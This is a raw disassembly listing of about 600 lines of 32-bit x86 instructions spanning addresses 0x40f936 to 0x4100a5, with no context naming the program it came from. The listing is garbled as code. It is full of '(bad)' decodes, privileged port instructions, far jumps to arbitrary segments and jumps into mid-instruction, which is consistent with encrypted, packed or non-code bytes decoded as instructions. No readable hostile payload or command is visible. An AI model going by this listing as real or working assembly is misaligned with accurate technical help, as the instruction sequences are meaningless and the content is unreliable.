  40f936:	in     eax,dx
  40f937:	mov    edi,db0
  40f93a:	daa    
  40f93b:	fdivr  st,st(5)
  40f93d:	or     eax,0x5ac77dda
  40f942:	xor    ebp,DWORD PTR [esi+edi*4-0x75]
  40f946:	les    eax,FWORD PTR [edx+edi*1]
  40f949:	fwait
  40f94a:	jmp    0x40f8fe
  40f94c:	jp     0x40f902
  40f94e:	mov    ds:0x103c933,eax
  40f953:	dec    esi
  40f954:	(bad)
  40f957:	jb     0x40f9bd
  40f959:	div    DWORD PTR [ecx]
  40f95b:	(bad)  
  40f95c:	ror    ah,1
  40f95e:	fidivr WORD PTR [edi-0x37]
  40f961:	sub    bh,BYTE PTR [edx]
  40f963:	inc    eax
  40f964:	fst    DWORD PTR [esi+0x2b]
  40f967:	pop    DWORD PTR [edi-0x7c]
  40f96a:	inc    eax
  40f96b:	cmp    eax,0xcce0de73
  40f970:	(bad)  
  40f971:	pusha  
  40f972:	jl     0x40f97c
  40f974:	sahf   
  40f975:	div    BYTE PTR ds:0x2003a6d9
  40f97b:	adc    BYTE PTR [eax+0x4],al
  40f97e:	pop    esp
  40f97f:	inc    edi
  40f980:	aam    0xc0
  40f982:	mov    gs,WORD PTR ds:[eax+0x5d]
  40f986:	mov    ss,eax
  40f988:	dec    ecx
  40f989:	jmp    0x72bc8540
  40f98e:	fistp  WORD PTR [esi+0x2fbfb8d9]
  40f994:	icebp  
  40f995:	stos   BYTE PTR es:[edi],al
  40f996:	mov    bh,0x83
  40f998:	xchg   ebp,eax
  40f999:	jmp    0xd7a2d6c6
  40f99e:	mov    edx,ss
  40f9a0:	mov    bh,0xb0
  40f9a2:	push   edi
  40f9a3:	daa    
  40f9a4:	mov    ebp,0xeb632ab9
  40f9a9:	dec    edx
  40f9aa:	jge    0x40f980
  40f9ac:	in     eax,0xd
  40f9ae:	mov    esp,0x99610e8d
  40f9b3:	pushf  
  40f9b4:	xchg   BYTE PTR [ebx+0x4f],cl
  40f9b7:	push   edx
  40f9b8:	or     eax,0x7bebc54e
  40f9bd:	add    eax,0xdc84420d
  40f9c2:	ret    
  40f9c3:	std    
  40f9c4:	cmp    DWORD PTR [eax+esi*4+0x20903a95],edx
  40f9cb:	inc    esp
  40f9cc:	addr16 push cs
  40f9ce:	(bad)  
  40f9cf:	xchg   esi,eax
  40f9d0:	push   edi
  40f9d1:	or     eax,0x980407df
  40f9d6:	dec    esi
  40f9d7:	push   ss
  40f9d8:	jnp    0x40f984
  40f9da:	(bad)  
  40f9db:	fcomp  QWORD PTR [esi+0x3d13fab4]
  40f9e1:	les    ecx,FWORD PTR [ebp-0x4f1ca561]
  40f9e7:	into   
  40f9e8:	sbb    ebx,DWORD PTR [esp+ebx*1+0x20]
  40f9ec:	outs   dx,DWORD PTR ds:[esi]
  40f9ed:	cli    
  40f9ee:	(bad)  
  40f9ef:	js     0x40fa14
  40f9f1:	mov    ebp,0xe2b00a13
  40f9f6:	neg    BYTE PTR [ecx+0x20]
  40f9f9:	lock stos BYTE PTR es:[edi],al
  40f9fb:	shl    BYTE PTR es:[edx-0x3056de4],1
  40fa02:	lods   eax,DWORD PTR ds:[esi]
  40fa03:	jne    0x40fa4a
  40fa05:	test   DWORD PTR [edx+ebp*8],esi
  40fa08:	pop    ecx
  40fa09:	loop   0x40f9b3
  40fa0b:	mov    eax,0xfb5326ec
  40fa10:	jle    0x40fa02
  40fa12:	mov    edi,0xba639d6a
  40fa17:	mov    dl,0x6f
  40fa19:	into   
  40fa1a:	xor    ebx,DWORD PTR [esi+0x9247ebc]
  40fa20:	dec    ecx
  40fa21:	pop    ss
  40fa22:	(bad)  
  40fa23:	mov    dh,0x4d
  40fa25:	dec    eax
  40fa26:	pop    ebx
  40fa27:	or     ah,dh
  40fa29:	fst    QWORD PTR [eax+ebx*4]
  40fa2c:	and    BYTE PTR [edi-0x1f],al
  40fa2f:	add    DWORD PTR [ebp-0x20],ebp
  40fa32:	shr    ebx,cl
  40fa34:	test   cl,ch
  40fa36:	stos   BYTE PTR es:[edi],al
  40fa37:	xor    al,dh
  40fa39:	mov    edi,edi
  40fa3b:	(bad)
  40fa3f:	cmp    dh,cl
  40fa41:	mov    BYTE PTR [edx+0x21],ah
  40fa44:	sbb    esi,esp
  40fa46:	jecxz  0x40fab8
  40fa48:	ret    
  40fa49:	or     eax,0xe6be40d4
  40fa4e:	mov    edi,0xf514c54b
  40fa53:	and    DWORD PTR [ebx+0x5e],edi
  40fa56:	xlat   BYTE PTR ds:[ebx]
  40fa57:	sti    
  40fa58:	sar    DWORD PTR [esi],0x38
  40fa5b:	mov    eax,ds:0x2d81fc4d
  40fa60:	adc    DWORD PTR [edi+esi*8+0x66e41551],edx
  40fa67:	jmp    DWORD PTR [ecx-0x5eb52cab]
  40fa6d:	scas   al,BYTE PTR es:[edi]
  40fa6e:	push   ebp
  40fa6f:	mov    eax,ds:0xfea782b3
  40fa74:	pop    esi
  40fa75:	push   ecx
  40fa76:	jne    0x40fa82
  40fa78:	ret    
  40fa79:	mov    bl,0xb
  40fa7b:	mov    ch,0x46
  40fa7d:	neg    BYTE PTR [edi+0x6]
  40fa80:	in     eax,dx
  40fa81:	or     dl,BYTE PTR [ebp-0x4e152fc2]
  40fa87:	inc    eax
  40fa88:	adc    ch,BYTE PTR [edx]
  40fa8a:	std    
  40fa8b:	lds    esi,FWORD PTR [esp+eax*2-0x7ce2f937]
  40fa92:	fldcw  WORD PTR [esi+0x58]
  40fa95:	loop   0x40fa30
  40fa97:	lock mov ch,0xe0
  40fa9a:	pop    ds
  40fa9b:	jp     0x40fa6d
  40fa9d:	jge    0x40fa38
  40fa9f:	pop    esi
  40faa0:	fstp   QWORD PTR [ebp-0x1e]
  40faa3:	stc    
  40faa4:	je     0x40faef
  40faa6:	rol    dl,0x7c
  40faa9:	lahf   
  40faaa:	or     al,0x8b
  40faac:	rcr    DWORD PTR [edx+0x4bb77743],1
  40fab2:	sbb    esi,DWORD PTR [esi+ecx*8+0x7e]
  40fab6:	fstp   QWORD PTR [ebx+0x45]
  40fab9:	jge    0x40fa65
  40fabb:	push   es
  40fabc:	scas   eax,DWORD PTR es:[edi]
  40fabd:	fs fwait
  40fabf:	popa   
  40fac0:	cld    
  40fac1:	retf   0x4b9d
  40fac4:	jo     0x40fa67
  40fac6:	(bad)  
  40fac7:	sbb    eax,0xb6271c18
  40facc:	push   0xffffff9d
  40face:	test   eax,0x1c89e236
  40fad3:	dec    esp
  40fad4:	mov    bh,0xd7
  40fad6:	xlat   BYTE PTR ds:[ebx]
  40fad7:	icebp  
  40fad8:	fwait
  40fad9:	add    BYTE PTR [esp+eax*4],0xc7
  40fadd:	mov    BYTE PTR [eax-0x19a3d673],ah
  40fae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fae4:	mov    BYTE PTR [edx+eiz*8+0x4a57408],cl
  40faeb:	adc    dh,BYTE PTR [eax+esi*4]
  40faee:	mov    ebx,0x553c2487
  40faf3:	(bad)  
  40faf5:	sbb    eax,0x7a75fb72
  40fafa:	mov    esi,0x6dcda7ef
  40faff:	fcmovnu st,st(4)
  40fb01:	and    eax,0xc864380a
  40fb06:	aas    
  40fb07:	stos   BYTE PTR es:[edi],al
  40fb08:	ret    0x922c
  40fb0b:	sbb    BYTE PTR [edx-0x6b60a40e],0xd3
  40fb12:	in     eax,0x28
  40fb14:	add    BYTE PTR [eax+ebx*8+0x25],ah
  40fb18:	stos   BYTE PTR es:[edi],al
  40fb19:	enter  0x424b,0x40
  40fb1d:	xchg   edx,eax
  40fb1e:	sbb    eax,0xfe1aedf6
  40fb23:	mov    al,0xb6
  40fb25:	cmp    BYTE PTR [eax-0x11],dl
  40fb28:	push   ss
  40fb29:	out    dx,al
  40fb2a:	sbb    BYTE PTR [esi],bl
  40fb2c:	not    esi
  40fb2e:	pop    ecx
  40fb2f:	jae    0x40fb13
  40fb31:	xor    BYTE PTR [edx],al
  40fb33:	stos   DWORD PTR es:[edi],eax
  40fb34:	xchg   esi,eax
  40fb35:	xchg   ebx,eax
  40fb36:	pop    ss
  40fb37:	mov    esp,0x8b7e23f0
  40fb3c:	push   ebx
  40fb3d:	sbb    al,0x5f
  40fb3f:	js     0x40fb32
  40fb41:	aad    0x94
  40fb43:	add    DWORD PTR [edx+0x7cf294c3],edx
  40fb49:	mov    ebp,0x6194b9f9
  40fb4e:	addr16 xchg esp,eax
  40fb50:	inc    edx
  40fb51:	shr    BYTE PTR [edi+0xd],cl
  40fb54:	icebp  
  40fb55:	push   0xffffffc9
  40fb57:	mov    edi,0x6d5a44a1
  40fb5c:	ret    0x1014
  40fb5f:	lock dec ecx
  40fb61:	(bad)  
  40fb62:	xor    eax,0xbba32243
  40fb67:	mov    ?,WORD PTR [eax+0x28]
  40fb6a:	jge    0x40fba9
  40fb6c:	sbb    ebx,DWORD PTR gs:[edx+ebp*8-0x22f36706]
  40fb74:	jmp    0x98b0:0x2235d4f3
  40fb7b:	inc    edx
  40fb7c:	mov    ah,0x73
  40fb7e:	fcmovnb st,st(3)
  40fb80:	ins    BYTE PTR es:[edi],dx
  40fb81:	sbb    edx,DWORD PTR [ebx]
  40fb83:	out    0x21,eax
  40fb85:	ficomp WORD PTR [edi+0x171cabbd]
  40fb8b:	xchg   ebx,eax
  40fb8c:	push   edx
  40fb8d:	fcmovnb st,st(7)
  40fb8f:	add    dh,BYTE PTR [edi]
  40fb91:	sbb    al,0xf5
  40fb93:	stos   BYTE PTR es:[edi],al
  40fb94:	mov    ds:0xa8fcc096,al
  40fb99:	retf   
  40fb9a:	or     DWORD PTR [edi],ecx
  40fb9c:	jmp    0x40fc18
  40fb9e:	scas   eax,DWORD PTR es:[edi]
  40fb9f:	dec    eax
  40fba0:	jmp    0xbc01:0x1a95cd46
  40fba7:	cmp    eax,0xe883f364
  40fbac:	(bad)  
  40fbad:	retf   
  40fbae:	div    BYTE PTR [eax]
  40fbb0:	dec    esi
  40fbb1:	mov    ebp,0x84696663
  40fbb6:	xchg   edi,eax
  40fbb7:	xchg   ecx,eax
  40fbb8:	rcr    DWORD PTR [ecx],1
  40fbba:	xor    edi,DWORD PTR [ecx+0x1be6c115]
  40fbc0:	sub    ecx,DWORD PTR ds:0x93cf7df8
  40fbc6:	out    0x90,eax
  40fbc8:	or     bl,BYTE PTR [ecx]
  40fbca:	and    cl,BYTE PTR [edx+ebx*2]
  40fbcd:	adc    eax,0xfbee386b
  40fbd2:	pop    edi
  40fbd3:	add    al,0x80
  40fbd5:	cmp    edi,DWORD PTR [edi+0x61c81094]
  40fbdb:	shl    DWORD PTR [ecx-0x2],cl
  40fbde:	jmp    0xc032:0xca7027eb
  40fbe5:	xor    cl,bl
  40fbe7:	(bad)  
  40fbe8:	or     al,0xc7
  40fbea:	loopne 0x40fc69
  40fbec:	jle    0x40fb7d
  40fbee:	cmp    al,cl
  40fbf0:	leave  
  40fbf1:	out    dx,eax
  40fbf2:	xor    DWORD PTR cs:[ebx-0x68],esi
  40fbf6:	scas   eax,DWORD PTR es:[edi]
  40fbf7:	cdq    
  40fbf8:	push   0x674c48f8
  40fbfd:	pop    ebp
  40fbfe:	pop    eax
  40fbff:	add    BYTE PTR [edi+0x7c3f7cdb],ch
  40fc05:	call   0x8dad:0xa49cf341
  40fc0c:	jmp    0x3f8b2162
  40fc11:	adc    eax,0xad9d2a74
  40fc16:	pushf  
  40fc17:	mov    ch,0xf3
  40fc19:	test   al,0xb7
  40fc1b:	push   es
  40fc1c:	xlat   BYTE PTR ds:[ebx]
  40fc1d:	pusha  
  40fc1e:	xlat   BYTE PTR ds:[ebx]
  40fc1f:	loopne 0x40fc16
  40fc21:	inc    BYTE PTR [ebx+0x475b471e]
  40fc27:	inc    esp
  40fc28:	dec    edi
  40fc29:	sti    
  40fc2a:	add    DWORD PTR [esi+0x50],edi
  40fc2d:	(bad)  [ebp-0x1afcc166]
  40fc33:	shr    BYTE PTR fs:[ecx],0x85
  40fc37:	ret    0x9dd0
  40fc3a:	xor    esp,DWORD PTR [esi-0x1d]
  40fc3d:	sub    eax,0x431ec0f9
  40fc42:	loopne 0x40fc20
  40fc44:	and    esi,ebp
  40fc46:	scas   eax,DWORD PTR es:[edi]
  40fc47:	jg     0x40fbfe
  40fc49:	sti    
  40fc4a:	cld    
  40fc4b:	pop    ds
  40fc4c:	jno    0x40fc54
  40fc4e:	mov    edi,0x66108cc0
  40fc53:	outs   dx,BYTE PTR ds:[esi]
  40fc54:	imul   ebp,DWORD PTR [edi+0x2bf672f2],0xd27ae1d7
  40fc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc5f:	inc    edx
  40fc60:	cmp    eax,0xe74497c
  40fc65:	ins    DWORD PTR es:[edi],dx
  40fc66:	xchg   esi,eax
  40fc67:	rcr    BYTE PTR [esi-0x2a],1
  40fc6a:	stc    
  40fc6b:	les    edi,FWORD PTR [eax+0x37daf5cc]
  40fc71:	imul   edx,DWORD PTR [eax-0x72a18340],0xffffffb1
  40fc78:	not    DWORD PTR [edi+0x75]
  40fc7b:	in     eax,dx
  40fc7c:	mov    bh,0xa7
  40fc7e:	mov    edx,0x5a7f79d8
  40fc83:	cs mov ebx,0xf2579f8e
  40fc89:	aam    0x8b
  40fc8b:	clc    
  40fc8c:	test   BYTE PTR [ecx],ah
  40fc8e:	mov    ebp,0x9f2e27d3
  40fc93:	in     al,dx
  40fc94:	and    BYTE PTR [edi+eiz*1],0xda
  40fc98:	ja     0x40fc7f
  40fc9a:	pop    ecx
  40fc9b:	enter  0x25a9,0xb6
  40fc9f:	push   ebx
  40fca0:	rcl    ebx,cl
  40fca2:	jmp    0x7cc8:0x78d0111d
  40fca9:	cmp    bh,ch
  40fcab:	push   ebp
  40fcac:	xor    bl,ah
  40fcae:	push   ebx
  40fcaf:	add    al,0xf6
  40fcb1:	mov    edx,es
  40fcb3:	dec    ebp
  40fcb4:	in     al,0xab
  40fcb6:	add    eax,0x1afd630e
  40fcbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcbc:	fcom   DWORD PTR [ebp+0x7d]
  40fcbf:	xor    eax,0x450a3855
  40fcc4:	pop    ebx
  40fcc5:	sbb    bh,BYTE PTR [edx-0x4d979cff]
  40fccb:	ss inc esi
  40fccd:	mov    ch,0xf5
  40fccf:	mov    dh,0x42
  40fcd1:	jmp    0x40fd1b
  40fcd3:	xlat   BYTE PTR ds:[ebx]
  40fcd4:	jbe    0x40fce5
  40fcd6:	xor    DWORD PTR [edx+0x7],esp
  40fcd9:	clc    
  40fcda:	call   0x95a2:0xc9f49267
  40fce1:	loopne 0x40fc85
  40fce3:	cli    
  40fce4:	mov    edx,DWORD PTR [edx+0x42]
  40fce7:	jg     0x40fc69
  40fce9:	bound  eax,QWORD PTR [edx-0x1]
  40fcec:	(bad)  
  40fcee:	jmp    0xac7954d9
  40fcf3:	stos   DWORD PTR es:[edi],eax
  40fcf4:	cmp    edi,esi
  40fcf6:	mov    edx,0xa0323712
  40fcfb:	xchg   ebp,eax
  40fcfc:	mov    dl,0x50
  40fcfe:	cmc    
  40fcff:	enter  0x63d,0x25
  40fd03:	xchg   ebx,eax
  40fd04:	das    
  40fd05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd06:	popa   
  40fd07:	sub    al,0x2e
  40fd09:	or     BYTE PTR [edx+0x2a569966],dl
  40fd0f:	push   0xffffff91
  40fd11:	mov    ch,0x18
  40fd13:	or     al,0xa8
  40fd15:	fdiv   st,st(2)
  40fd17:	psubq  mm0,QWORD PTR [eiz*4+0xdfcf491]
  40fd1f:	daa    
  40fd20:	dec    ecx
  40fd21:	pop    ebx
  40fd22:	sbb    esp,DWORD PTR [edi-0x13]
  40fd25:	lock outs dx,DWORD PTR ds:[esi]
  40fd27:	shl    DWORD PTR [ebp+0x23103772],cl
  40fd2d:	pop    ebx
  40fd2e:	inc    edx
  40fd2f:	sub    DWORD PTR [edx+esi*8+0x60a52f7f],0x58
  40fd37:	cmc    
  40fd38:	sbb    edx,DWORD PTR [eax]
  40fd3a:	repz push es
  40fd3c:	(bad)  
  40fd3d:	imul   edx,ecx,0xeeb9f85c
  40fd43:	lahf   
  40fd44:	enter  0xace1,0x9b
  40fd48:	mov    WORD PTR [edx+0x68ed30cd],?
  40fd4e:	shr    BYTE PTR [ebx-0x77],cl
  40fd51:	fcom   QWORD PTR [esi+0x72]
  40fd54:	pusha  
  40fd55:	bound  edi,QWORD PTR [ebp+0x7d]
  40fd58:	fistp  QWORD PTR [edx]
  40fd5a:	in     al,0x3
  40fd5c:	(bad)  
  40fd5d:	outs   dx,DWORD PTR ds:[esi]
  40fd5e:	jg     0x40fd20
  40fd60:	test   al,0xfa
  40fd62:	sub    BYTE PTR [esi+ebx*2+0x32539a40],ah
  40fd69:	sar    DWORD PTR [esi],cl
  40fd6b:	jne    0x40fd71
  40fd6d:	mov    ds:0xe743eda4,eax
  40fd72:	mov    dl,0x78
  40fd74:	test   eax,0x1d52b2a7
  40fd79:	pop    ebp
  40fd7a:	pop    eax
  40fd7b:	xchg   edx,eax
  40fd7c:	xchg   ebx,eax
  40fd7d:	and    edi,DWORD PTR [edx]
  40fd7f:	in     al,dx
  40fd80:	pop    ds
  40fd81:	xor    edi,esp
  40fd83:	data16 jne 0x40fde5
  40fd86:	jo     0x40fd23
  40fd88:	call   0x123:0x8aa1ba98
  40fd8f:	addr16 and ax,0x60ac
  40fd94:	retf   0x758
  40fd97:	jne    0x40fd19
  40fd99:	sti    
  40fd9a:	test   eax,0xdb9936cf
  40fd9f:	xor    ecx,DWORD PTR [esi]
  40fda1:	std    
  40fda2:	push   0x1f14622b
  40fda7:	pop    ecx
  40fda8:	pop    eax
  40fda9:	adc    al,0x86
  40fdab:	adc    al,0x76
  40fdad:	cli    
  40fdae:	cmp    DWORD PTR [ecx-0x55],edx
  40fdb1:	mov    ds:0xda3ea432,al
  40fdb6:	adc    al,0xda
  40fdb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdb9:	retf   0x7e1c
  40fdbc:	cmp    al,0x6f
  40fdbe:	dec    esp
  40fdbf:	add    al,0x6
  40fdc1:	push   ss
  40fdc2:	cmp    esi,esp
  40fdc4:	call   0x7fae2ac
  40fdc9:	jle    0x40fdb6
  40fdcb:	lock (bad) 
  40fdce:	mov    ebx,0x755757f5
  40fdd3:	xor    edi,0x56
  40fdd6:	outs   dx,DWORD PTR ds:[esi]
  40fdd7:	sbb    eax,0xcea7bd66
  40fddc:	icebp  
  40fddd:	hlt    
  40fdde:	sub    bh,BYTE PTR [edi-0x4a]
  40fde1:	adc    DWORD PTR [eax+0x38e97315],0xb594970f
  40fdeb:	out    0x6d,eax
  40fded:	pop    edx
  40fdee:	or     eax,0xbf266e59
  40fdf3:	push   ebx
  40fdf4:	inc    ebx
  40fdf5:	push   0x63ec6b9b
  40fdfa:	aaa    
  40fdfb:	jno    0x40fe38
  40fdfd:	outs   dx,BYTE PTR ds:[esi]
  40fdfe:	outs   dx,BYTE PTR ds:[esi]
  40fdff:	int    0x44
  40fe01:	mov    ds:0x423bf91e,eax
  40fe06:	and    al,0x43
  40fe08:	mov    esp,0x4b69a443
  40fe0d:	pop    esi
  40fe0e:	out    0xbd,eax
  40fe10:	repz cmp BYTE PTR gs:[esi-0x6fab2c55],0xac
  40fe19:	out    dx,al
  40fe1a:	clc    
  40fe1b:	int    0x2d
  40fe1d:	push   es
  40fe1e:	test   al,0xdf
  40fe20:	lahf   
  40fe21:	mov    al,ds:0xdd7933de
  40fe26:	lods   eax,DWORD PTR ds:[esi]
  40fe27:	add    al,bl
  40fe29:	fidivr DWORD PTR [edi+eiz*1+0x374fae99]
  40fe30:	adc    edx,DWORD PTR gs:[eax-0x4155b9e4]
  40fe37:	push   ds
  40fe38:	pop    ds
  40fe39:	mov    eax,0x2efd50c6
  40fe3e:	xchg   DWORD PTR [esi-0x54],esi
  40fe41:	retf   0xc1e3
  40fe44:	ror    BYTE PTR [ebx-0x777ddd81],0x87
  40fe4b:	xor    DWORD PTR [ebp-0x63aa9dd0],0x26
  40fe52:	sub    al,0x87
  40fe54:	pop    ss
  40fe55:	inc    ebx
  40fe56:	mov    al,ds:0x15308234
  40fe5b:	je     0x40febe
  40fe5d:	inc    esi
  40fe5e:	pop    es
  40fe5f:	and    ch,BYTE PTR [ebp-0x4d]
  40fe62:	adc    dl,bl
  40fe64:	push   esp
  40fe65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe66:	adc    DWORD PTR [eax+0x46],eax
  40fe69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6a:	cld    
  40fe6b:	xor    bl,cl
  40fe6d:	add    esi,DWORD PTR ds:0x1d53d2e2
  40fe73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe74:	mov    ah,0x5b
  40fe76:	jge    0x40fed1
  40fe78:	xlat   BYTE PTR ds:[ebx]
  40fe79:	jo     0x40fe7e
  40fe7b:	pop    ss
  40fe7c:	push   esp
  40fe7d:	(bad)  
  40fe7e:	in     eax,dx
  40fe7f:	add    al,cl
  40fe81:	push   edi
  40fe82:	sbb    al,0x5c
  40fe84:	adc    BYTE PTR ds:0xe23ce939,al
  40fe8a:	or     esp,DWORD PTR [esi]
  40fe8c:	and    BYTE PTR [edi+ebp*8-0xb],bl
  40fe90:	jg     0x40fe64
  40fe92:	push   edx
  40fe93:	dec    edi
  40fe94:	dec    edi
  40fe95:	pushf  
  40fe96:	mov    ds:0x607d6682,al
  40fe9b:	popf   
  40fe9c:	lods   al,BYTE PTR ds:[esi]
  40fe9d:	push   esp
  40fe9e:	adc    BYTE PTR [esi-0x19],dl
  40fea1:	mov    ecx,0x7733d1ee
  40fea6:	cld    
  40fea7:	inc    ecx
  40fea8:	jecxz  0x40fed6
  40feaa:	addps  xmm1,XMMWORD PTR ds:0x14728332
  40feb1:	inc    ebp
  40feb2:	adc    edx,DWORD PTR [esi]
  40feb4:	arpl   WORD PTR [ebx-0x1293638b],si
  40feba:	ss ret 
  40febc:	(bad)  
  40febd:	std    
  40febe:	or     al,dl
  40fec0:	(bad)  
  40fec1:	mov    bl,0x29
  40fec3:	cmp    al,0x16
  40fec5:	and    eax,0x63534f18
  40feca:	jne    0x40feab
  40fecc:	jb     0x40fe7d
  40fece:	or     al,0xd5
  40fed0:	mov    fs,WORD PTR [ecx-0x35]
  40fed3:	push   ebx
  40fed4:	cld    
  40fed5:	sahf   
  40fed6:	mov    ch,0x97
  40fed8:	aas    
  40fed9:	or     dh,ah
  40fedb:	test   al,0x88
  40fedd:	sahf   
  40fede:	gs (bad) 
  40fee0:	adc    eax,0x346bedcc
  40fee5:	adc    bl,al
  40fee7:	xchg   DWORD PTR [ebx-0x58f09fd9],eax
  40feed:	sbb    DWORD PTR [esi+0x6c],edx
  40fef0:	sar    DWORD PTR [edx-0x658aad51],0x15
  40fef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef8:	and    al,0x1e
  40fefa:	in     eax,0x97
  40fefc:	jnp    0x40feab
  40fefe:	xchg   ebx,eax
  40feff:	in     eax,dx
  40ff00:	adc    cl,ch
  40ff02:	pop    esi
  40ff03:	add    edx,DWORD PTR [esi-0x5a632dee]
  40ff09:	dec    ebp
  40ff0a:	mov    WORD PTR [esi-0x768dba43],gs
  40ff10:	hlt    
  40ff11:	pop    ds
  40ff12:	sub    ebx,DWORD PTR [ebp-0x4c]
  40ff15:	div    esp
  40ff17:	cwde   
  40ff18:	dec    eax
  40ff19:	push   ecx
  40ff1a:	pop    DWORD PTR [eax]
  40ff1c:	jae    0x40ff69
  40ff1e:	xor    ecx,esi
  40ff20:	mul    eax
  40ff22:	pop    eax
  40ff23:	adc    DWORD PTR [eax-0x460d1a48],edi
  40ff29:	and    DWORD PTR [ecx-0x453cd066],0x9f21ad33
  40ff33:	xchg   ebx,eax
  40ff34:	sar    BYTE PTR [eax+0x25],cl
  40ff37:	out    0xd7,al
  40ff39:	mov    ecx,DWORD PTR [edi+0xf]
  40ff3c:	and    eax,0xed6c3ca0
  40ff41:	push   ecx
  40ff42:	pop    edx
  40ff43:	or     al,0x27
  40ff45:	repz (bad)
  40ff48:	mov    bh,0x8f
  40ff4a:	sbb    eax,0xbad2e222
  40ff4f:	push   edx
  40ff50:	and    al,0x51
  40ff52:	mov    dh,0x8e
  40ff54:	jne    0x40ff31
  40ff56:	push   ecx
  40ff57:	add    BYTE PTR [edi],0x43
  40ff5a:	push   es
  40ff5b:	stc    
  40ff5c:	icebp  
  40ff5d:	es nop
  40ff5f:	pop    edx
  40ff60:	jle    0x40ff62
  40ff62:	xor    ebp,DWORD PTR ds:0x98cba431
  40ff68:	push   ds
  40ff69:	fmul   QWORD PTR [ebp-0xb]
  40ff6c:	or     cl,BYTE PTR [eax]
  40ff6e:	aaa    
  40ff6f:	jl     0x40ff1f
  40ff71:	out    0xbe,eax
  40ff73:	inc    ebx
  40ff74:	xchg   esi,eax
  40ff75:	jge    0x40ff1f
  40ff77:	jo     0x40ff9c
  40ff79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff7a:	adc    bl,ah
  40ff7c:	or     ebp,DWORD PTR [edi+0x11]
  40ff7f:	sub    al,0x68
  40ff81:	sbb    eax,0xb9651b85
  40ff86:	cmp    BYTE PTR [edx+0x412ef3e0],dh
  40ff8c:	pusha  
  40ff8d:	xchg   ebp,eax
  40ff8e:	jnp    0x40ff44
  40ff90:	clc    
  40ff91:	aad    0x46
  40ff93:	je     0x40ff69
  40ff95:	dec    edi
  40ff96:	xchg   edi,eax
  40ff97:	lahf   
  40ff98:	cli    
  40ff99:	cmp    BYTE PTR [ebx-0x16119fca],0xc0
  40ffa0:	clc    
  40ffa1:	in     eax,0x1a
  40ffa3:	ror    BYTE PTR [eax],1
  40ffa5:	cmp    ebp,DWORD PTR [eax-0x707256dd]
  40ffab:	mov    WORD PTR [edi-0x7308aaca],?
  40ffb1:	lods   al,BYTE PTR ds:[esi]
  40ffb2:	loop   0x40ff43
  40ffb4:	push   eax
  40ffb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffb6:	mov    al,ds:0xa54c7c8f
  40ffbb:	lock or ebp,esp
  40ffbe:	add    DWORD PTR [edi-0x14],edx
  40ffc1:	cmp    al,0xc
  40ffc3:	adc    ecx,DWORD PTR [ecx]
  40ffc5:	repnz bound ecx,QWORD PTR [ebp+0x3b]
  40ffc9:	ret    0x5830
  40ffcc:	pop    esp
  40ffcd:	sub    bh,BYTE PTR [edx+0x13df2121]
  40ffd3:	pop    ecx
  40ffd4:	rcl    BYTE PTR [ebp+eiz*4-0x73],1
  40ffd8:	std    
  40ffd9:	(bad)  
  40ffdb:	push   0x5bafa858
  40ffe0:	and    al,ch
  40ffe2:	push   ebx
  40ffe3:	adc    al,0x44
  40ffe5:	pop    edx
  40ffe6:	mov    ebp,0x20f58412
  40ffeb:	xchg   ecx,eax
  40ffec:	call   0x8e9b:0x54375de7
  40fff3:	retf   
  40fff4:	dec    edx
  40fff5:	ins    DWORD PTR es:[edi],dx
  40fff6:	add    bh,BYTE PTR [esi+0x764e8109]
  40fffc:	je     0x41000d
  40fffe:	repz div ebx
  410001:	adc    eax,0xeccd0b81
  410006:	xor    al,0x52
  410008:	loopne 0x40ffee
  41000a:	lods   al,BYTE PTR ds:[esi]
  41000b:	out    dx,al
  41000c:	in     eax,0x96
  41000e:	lahf   
  41000f:	fild   QWORD PTR [eax+0x1fb71c85]
  410015:	shr    BYTE PTR [esi],cl
  410017:	loope  0x410077
  410019:	jnp    0x40ffde
  41001b:	fstp   st(3)
  41001d:	jg     0x40fff0
  41001f:	ret    
  410020:	push   edi
  410021:	pop    ebp
  410022:	in     eax,dx
  410023:	clc    
  410024:	rcl    DWORD PTR [edi],cl
  410026:	jae    0x41006b
  410028:	je     0x410074
  41002a:	scas   eax,DWORD PTR es:[edi]
  41002b:	lods   al,BYTE PTR ds:[esi]
  41002c:	popa   
  41002d:	adc    ebp,DWORD PTR [edx+ebp*8+0x5776e4fd]
  410034:	sbb    ecx,DWORD PTR [edx+esi*1-0x48c08ce4]
  41003b:	mov    ecx,fs
  41003d:	pop    edx
  41003e:	push   esp
  41003f:	repz das 
  410041:	inc    edi
  410042:	dec    esi
  410043:	xchg   esi,eax
  410044:	push   ds
  410045:	xchg   edi,eax
  410046:	retf   
  410047:	repz data16 icebp 
  41004a:	jbe    0x410089
  41004c:	sub    eax,0x6057f247
  410051:	sub    DWORD PTR [edi],esp
  410053:	dec    ebx
  410054:	mov    gs,WORD PTR [edx]
  410056:	mov    WORD PTR [ebp+0x28],?
  410059:	dec    ecx
  41005a:	mov    esi,DWORD PTR [edi-0x26]
  41005d:	mov    DWORD PTR [edi+0x17f1eef3],edx
  410063:	or     eax,DWORD PTR [ebp+ebp*8-0xbd2b574]
  41006a:	mov    edi,0xd16c965d
  41006f:	push   ss
  410070:	sbb    al,0x0
  410072:	pop    edx
  410073:	mov    ch,0xcf
  410075:	(bad)  
  410076:	int3   
  410077:	sub    bh,BYTE PTR [edi-0x5e]
  41007a:	jle    0x41002d
  41007c:	jge    0x4100d3
  41007e:	out    0x5,al
  410080:	mov    ss,WORD PTR [edi+0x25]
  410083:	adc    al,0xda
  410085:	or     eax,0x9fdb45d4
  41008a:	push   0xcc3b3cf7
  41008f:	lea    ebp,[ecx-0x48]
  410092:	retf   0x7b7d
  410095:	jnp    0x410079
  410097:	pop    es
  410098:	pop    ds
  410099:	or     al,0xd8
  41009b:	cmc    
  41009c:	sar    BYTE PTR [eax+0x75473663],cl
  4100a2:	jae    0x410059
  4100a4:	dec    eax
  4100a5:	push   es
